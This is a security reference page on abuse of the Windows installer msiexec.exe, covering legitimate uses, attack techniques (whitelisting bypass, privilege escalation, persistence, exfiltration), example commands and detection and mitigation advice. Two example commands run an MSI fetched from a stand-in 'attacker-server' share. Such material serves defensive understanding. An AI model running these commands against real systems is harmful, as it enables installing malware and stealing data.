# msiexec.exe
## What is it?
*```msiexec.exe``` is the Windows installer service executable, used to install, modify, and remove software packages that are distributed in the MSI (Microsoft Installer) format.*
*It provides functionality to execute .msi files for installation or maintenance tasks, and it’s a trusted system binary often used by legitimate software installations.*

## Legitimate Usage
- **Software Installation** → ```msiexec.exe``` is used by administrators and users to install software packages, run updates, or uninstall programs.
- **Software Maintenance** → It's used to perform repairs or modifications to installed applications (e.g., updates or missing files).
- **Administrative Tasks** → IT administrators use ```msiexec.exe``` to silently install or update software on multiple machines across an enterprise network.

## How to abuse it
- **Execution of Malicious MSI Packages** → Attackers can abuse ```msiexec.exe``` to silently execute malicious MSI files that contain payloads or malware.
- **Bypassing Application Whitelisting** → Since ```msiexec.exe``` is a trusted, signed executable, it can be used to run malicious code even if application whitelisting is in place.
- **Privilege Escalation** → Attackers can abuse the MSI installation process to execute payloads that elevate privileges, especially when administrators execute the MSI package with elevated rights.
- **Persistence Mechanism** → Attackers can create MSI packages that automatically execute malicious payloads upon installation, ensuring persistence on the compromised system.

## Example attacks
### 1. Malicious MSI Installation
*Attackers can craft malicious MSI files that contain payloads designed to run once executed by ```msiexec.exe```.*

**Run Malicious MSI Package**

```
msiexec.exe /i C:\path\to\malicious.msi
```

**Effect:**
- The MSI file is executed, and the embedded malicious payload runs, leading to system compromise or malware installation.

### 2. Bypassing Application Whitelisting
*Because ```msiexec.exe``` is a legitimate, trusted binary, attackers can use it to execute malicious MSI files even in environments where application whitelisting is enforced.*

**Execute Malicious MSI via msiexec.exe**

```
msiexec.exe /i \attacker-server\share\malicious.msi
```

**Effect:**
- The trusted Windows installer runs the malicious MSI file, bypassing application whitelisting or antivirus protections.

### 3. Privilege Escalation via Malicious MSI
*Malicious MSI files can be designed to execute commands or payloads with elevated privileges, leading to privilege escalation.*

**Create and Install Privilege Escalating MSI**

```
msiexec.exe /i C:\path\to\privileged.msi
```

**Effect:**
- The malicious MSI file runs with elevated privileges, potentially granting the attacker administrative rights on the system.

### 4. Persistence via MSI Files
*Attackers can create MSI packages that ensure persistence by embedding malicious payloads that run automatically upon installation.*

**Create MSI to Install Malware on Startup**

```
msiexec.exe /i C:\path\to\malware.msi
```

**Effect:**
- The MSI file installs malware and may add registry keys or tasks that ensure the malware runs on startup, establishing persistence on the system.

### 5. Silent Exfiltration via MSI
*Attackers can use MSI files to silently execute commands that steal data from the system or exfiltrate it without raising alarms.*

**Create MSI for Silent Data Exfiltration**

```
msiexec.exe /i \attacker-server\share\exfil.msi
```

**Effect:**
- The MSI file runs, executing embedded scripts or commands to exfiltrate sensitive data to a remote server, all without user interaction or alerting security software.

# Detection & Mitigation
## Detection Methods
**Monitor for Unusual msiexec.exe Activity**
- **Event ID 4688 (Process Creation)** → Track the execution of ```msiexec.exe``` to ensure it's being used for legitimate purposes.
- **Look for Suspicious MSI Files** → Watch for the execution of MSI files from unusual or temporary locations or network shares.

**Monitor for Elevated Privileges**
- **Event ID 4672 (Special Privileges Assigned to New Logon)** → Detect when ```msiexec.exe``` is executed with elevated privileges or system-level access.

**Detect Silent Installation**
- **Event ID 11707 (MsiInstaller Event)** → Look for suspicious MSI installations that don’t correspond with normal user or administrative activity.

## Mitigation Strategies
- **Application Whitelisting** → Use tools like AppLocker or Device Guard to ensure only trusted executables and MSI files can run.
- **Limit Execution of msiexec.exe** → Restrict access to ```msiexec.exe``` and limit who can run it, especially under elevated privileges.
- **Monitor File Access Logs** → Keep track of where MSI files are being executed from (e.g., network shares or temporary folders) and alert on suspicious behavior.
- **Restrict Network Shares** → Block untrusted network shares from executing MSI files, particularly those that come from external or unknown sources.
- **Block Known Malicious MSI Files** → Use threat intelligence feeds to block known malicious MSI file hashes and signatures.
